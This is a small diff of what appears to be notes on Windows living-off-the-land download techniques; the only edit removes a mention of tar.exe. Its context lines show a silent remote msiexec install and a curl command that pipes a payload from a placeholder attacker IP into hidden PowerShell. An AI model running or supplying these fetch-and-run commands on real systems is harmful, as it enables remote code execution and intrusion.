@@ -4,7 +4,7 @@
 	
 	Command-Line:  msiexec /i http://server/package.msi /qn
 
-2). Windows 10 version 1803 (and earlier, with insider build 17063) includes a native curl.exe (and tar.exe ) in C:\Windows\System32\, which you can access right from your regular CMD.
+2). Windows 10 version 1803 (and earlier, with insider build 17063) includes a native curl.exe in C:\Windows\System32\, which you can access right from your regular CMD.
 	
 	Command-Line: curl http://<attacker-ip>/<payload-name>.txt | powershell -w h
 
